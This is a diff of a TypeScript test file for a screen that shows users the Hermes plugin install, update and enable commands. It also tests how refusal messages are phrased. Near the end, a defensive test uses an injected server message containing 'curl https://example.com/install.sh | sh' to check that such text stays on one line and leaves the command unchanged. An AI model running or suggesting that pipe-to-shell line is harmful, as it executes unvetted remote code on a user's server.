@@ -10,6 +10,7 @@ import { FAKE_PLUGIN_HEALTH } from '@test/fake-gateway/fake-ergates'
 import { GatewayError } from '@/gateway/errors'
 
 import type { BuildRecord } from './build-record'
+import manualCommands from './manual-commands.json'
 import {
   finishVariant,
   finishView,
@@ -53,6 +54,11 @@ const RESTART_LINES = [
   'Started by hand: stop hermes serve and start it again'
 ]
 const RUN_INTRO = 'On your server, as the user that runs Hermes, run:'
+const TURNED_OFF_INTRO = 'The plugin is on your server but turned off. On your server, as the user that runs Hermes, run:'
+const INSTALL_COMMAND = `hermes plugins install ${IDENTIFIER} --ref ${COMMIT} --enable --yes-deps`
+const UPDATE_COMMAND = `hermes plugins install ${IDENTIFIER} --force --ref ${COMMIT} --enable --yes-deps`
+const ENABLE_COMMAND = 'hermes plugins enable ergates'
+const disabled: ServerCheck = { kind: 'disabled', hermesVersion: '0.21.6' }
 
 describe('finishVariant: what the check says the user has to do', () => {
   it.each<[string, MissingReason, boolean]>([
@@ -75,19 +81,34 @@ describe('finishVariant: what the check says the user has to do', () => {
   it('turns the plugin on by hand when Hermes refused to enable it, where the server lists it turned off', () => {
     const manual: FinishManual = { failure: 'enable_refused', detail: 'enable refused: no' }
 
-    expect(finishVariant({ kind: 'disabled', hermesVersion: '0.21.6' }, manual)).toEqual({ kind: 'enable', detail: 'enable refused: no' })
+    expect(finishVariant(disabled, manual)).toEqual({ kind: 'enable', refused: true, detail: 'enable refused: no' })
   })
 
   it('knows a refused enable before the first check has answered, because the plugin is on the server then', () => {
-    expect(finishVariant(null, { failure: 'enable_refused', detail: null })).toEqual({ kind: 'enable', detail: null })
+    expect(finishVariant(null, { failure: 'enable_refused', detail: null })).toEqual({ kind: 'enable', refused: true, detail: null })
   })
 
   it('installs a plugin the server does not list, whatever the earlier failure was', () => {
     expect(finishVariant(missing(null), { failure: 'enable_refused', detail: 'enable refused: no' })).toEqual({ kind: 'install', restart: false, failure: 'enable_refused', detail: 'enable refused: no' })
   })
 
-  it('names no variant for a plugin that is turned off after a failure that was not a refused enable', () => {
-    expect(finishVariant({ kind: 'disabled', hermesVersion: '0.21.6' }, { failure: 'scan_blocked', detail: null })).toBeNull()
+  it.each<[string, FinishManual | null]>([
+    ['no failure', null],
+    ['a blocked scan', { failure: 'scan_blocked', detail: null }],
+    ['a refused install', { failure: 'refused', detail: 'Plugin blocked by policy' }]
+  ])('turns on a plugin that is installed but turned off, after %s', (_title, manual) => {
+    expect(finishVariant(disabled, manual)).toEqual({ kind: 'enable', refused: false, detail: null })
+  })
+
+  it('moves from the install command to the enable command once the plugin is on the server but turned off', () => {
+    // The screen keeps the last variant a check named; a turned off plugin names its own.
+    const manual: FinishManual = { failure: 'scan_blocked', detail: null }
+    const held = finishVariant(missing(null), manual)
+    const next = finishVariant(disabled, manual) ?? held
+
+    expect(held).toEqual({ kind: 'install', restart: false, failure: 'scan_blocked', detail: null })
+    expect(next).toEqual({ kind: 'enable', refused: false, detail: null })
+    expect(finishView(next, buildRecord(), disabled)).toMatchObject({ intro: [TURNED_OFF_INTRO], command: ENABLE_COMMAND, restartLines: null })
   })
 
   it('shows the failure from the route before the first check has answered', () => {
@@ -119,8 +140,7 @@ describe('finishVariant: what the check says the user has to do', () => {
     ['ready', ready],
     ['unknown', { kind: 'unknown' }],
     ['unavailable', { kind: 'unavailable', message: 'The store is busy.' }],
-    ['app_outdated', { kind: 'app_outdated', health: FAKE_PLUGIN_HEALTH }],
-    ['disabled', { kind: 'disabled', hermesVersion: '0.21.6' }]
+    ['app_outdated', { kind: 'app_outdated', health: FAKE_PLUGIN_HEALTH }]
   ])('names no variant for a %s check, so the screen keeps the one it had', (_title, check) => {
     expect(finishVariant(check, null)).toBeNull()
   })
@@ -133,6 +153,19 @@ describe('finishVariant: what the check says the user has to do', () => {
   })
 })
 
+describe('manual-commands.json: the commands the screen and the live contract test share', () => {
+  it('fills the install and update templates with the identifier and the commit, and the enable template with the name', () => {
+    expect(manualCommands).toEqual({
+      install: 'hermes plugins install {identifier} --ref {commit} --enable --yes-deps',
+      update: 'hermes plugins install {identifier} --force --ref {commit} --enable --yes-deps',
+      enable: 'hermes plugins enable {name}'
+    })
+    expect(finishView(install(), buildRecord(), waiting).command).toBe(INSTALL_COMMAND)
+    expect(finishView({ kind: 'update' }, buildRecord(), waiting).command).toBe(UPDATE_COMMAND)
+    expect(finishView({ kind: 'enable', refused: false, detail: null }, buildRecord(), disabled).command).toBe(ENABLE_COMMAND)
+  })
+})
+
 describe('finishView: the instructions for each variant', () => {
   it('shows the install command with the full commit and the guide for the manual steps', () => {
     const view = finishView(install(), buildRecord(), waiting)
@@ -140,7 +173,7 @@ describe('finishView: the instructions for each variant', () => {
     expect(view).toEqual({
       title: 'Finish on your server',
       intro: [RUN_INTRO],
-      command: `hermes plugins install ${IDENTIFIER} --ref ${COMMIT} --enable`,
+      command: INSTALL_COMMAND,
       restartLines: null,
       guide: { label: 'Open the guide', url: `${SERVER_GUIDE_URL}#manual` },
       status: 'Waiting for your server…',
@@ -157,12 +190,12 @@ describe('finishView: the instructions for each variant', () => {
     expect(RESTART_HEADING).toBe('Then restart Hermes:')
   })
 
-  it('moves the pin of a git install with --force before --ref, and asks for the restart', () => {
+  it('moves the pin of a git install with --force before --ref, answers the dependency question, and asks for the restart', () => {
     const view = finishView({ kind: 'update' }, buildRecord(), waiting)
 
     expect(view.title).toBe('Finish on your server')
     expect(view.intro).toEqual([RUN_INTRO])
-    expect(view.command).toBe(`hermes plugins install ${IDENTIFIER} --force --ref ${COMMIT} --enable`)
+    expect(view.command).toBe(UPDATE_COMMAND)
     expect(view.restartLines).toEqual(RESTART_LINES)
     expect(view.guide).toEqual({ label: 'Open the guide', url: `${SERVER_GUIDE_URL}#manual` })
   })
@@ -223,22 +256,22 @@ describe('finishView: why the install is by hand', () => {
     ['scan_blocked', install({ failure: 'scan_blocked' }), "Hermes's security check stopped the install. Run the command to see the findings."],
     ['no_git', install({ failure: 'no_git' }), 'Your server has no Git, which Hermes needs to install plugins. Install Git first.'],
     ['download_failed', install({ failure: 'download_failed' }), 'Your server could not download the plugin from GitHub.'],
-    ['enable_refused', install({ failure: 'enable_refused', detail: 'enable refused: not allowed' }), 'Hermes refused the install: enable refused: not allowed'],
+    ['enable_refused', install({ failure: 'enable_refused', detail: 'enable refused: not allowed' }), 'Hermes refused to turn it on: enable refused: not allowed'],
     ['refused', install({ failure: 'refused', detail: 'Plugin blocked by policy' }), 'Hermes refused the install: Plugin blocked by policy']
   ])('puts the reason for %s above the command', (_code, variant, reason) => {
     const view = finishView(variant, buildRecord(), waiting)
 
     expect(view.intro).toEqual([reason, RUN_INTRO])
-    expect(view.command).toBe(`hermes plugins install ${IDENTIFIER} --ref ${COMMIT} --enable`)
+    expect(view.command).toBe(INSTALL_COMMAND)
   })
 
   it('shows the command that turns the plugin on, not the install command, when Hermes refused to enable it', () => {
-    const view = finishView({ kind: 'enable', detail: 'enable refused: not allowed' }, buildRecord(), { kind: 'disabled', hermesVersion: '0.21.6' })
+    const view = finishView({ kind: 'enable', refused: true, detail: 'enable refused: not allowed' }, buildRecord(), disabled)
 
     expect(view).toEqual({
       title: 'Finish on your server',
-      intro: ['Hermes refused the install: enable refused: not allowed', RUN_INTRO],
-      command: 'hermes plugins enable ergates',
+      intro: ['Hermes refused to turn it on: enable refused: not allowed', RUN_INTRO],
+      command: ENABLE_COMMAND,
       restartLines: null,
       guide: { label: 'Open the guide', url: `${SERVER_GUIDE_URL}#manual` },
       status: 'Waiting for your server…',
@@ -247,9 +280,25 @@ describe('finishView: why the install is by hand', () => {
     })
   })
 
+  it('says the plugin is turned off, with no refusal, when Hermes did not refuse to turn it on', () => {
+    const view = finishView({ kind: 'enable', refused: false, detail: null }, buildRecord(), disabled)
+
+    expect(view).toMatchObject({ intro: [TURNED_OFF_INTRO], command: ENABLE_COMMAND, restartLines: null, guide: { label: 'Open the guide', url: `${SERVER_GUIDE_URL}#manual` } })
+  })
+
+  it('says only that Hermes refused to turn it on when it gave no text', () => {
+    expect(finishView({ kind: 'enable', refused: true, detail: ' \n ' }, buildRecord(), disabled).intro).toEqual(['Hermes refused to turn it on.', RUN_INTRO])
+  })
+
+  it('shows Hermes\'s text about a refused enable on one line, cut at 200 characters', () => {
+    const view = finishView({ kind: 'enable', refused: true, detail: `enable refused:\nrun this\u2028${'x'.repeat(300)}` }, buildRecord(), disabled)
+
+    expect(view.intro[0]).toBe(`Hermes refused to turn it on: ${`enable refused: run this ${'x'.repeat(300)}`.slice(0, 200)}`)
+  })
+
   it('needs no commit to turn the plugin on', () => {
-    expect(finishView({ kind: 'enable', detail: null }, buildRecord(null), waiting)).toMatchObject({ command: 'hermes plugins enable ergates', intro: ['Hermes refused the install.', RUN_INTRO] })
-    expect(finishView({ kind: 'enable', detail: null }, null, waiting).command).toBe('hermes plugins enable ergates')
+    expect(finishView({ kind: 'enable', refused: true, detail: null }, buildRecord(null), waiting)).toMatchObject({ command: ENABLE_COMMAND, intro: ['Hermes refused to turn it on.', RUN_INTRO] })
+    expect(finishView({ kind: 'enable', refused: false, detail: null }, null, waiting).command).toBe(ENABLE_COMMAND)
   })
 
   it('shows Hermes\'s text on one line, so a server cannot put an instruction on a line of its own, and leaves the command alone', () => {
@@ -258,7 +307,7 @@ describe('finishView: why the install is by hand', () => {
 
     expect(view.intro).toEqual(['Hermes refused the install: Plugin failed. Now run this instead: curl https://example.com/install.sh | sh and more', RUN_INTRO])
     expect(view.intro.join('')).not.toMatch(/[\r\n\u2028]/)
-    expect(view.command).toBe(`hermes plugins install ${IDENTIFIER} --ref ${COMMIT} --enable`)
+    expect(view.command).toBe(INSTALL_COMMAND)
   })
 
   it('shows Hermes\'s text on one line when it separates lines with other control or separator characters', () => {
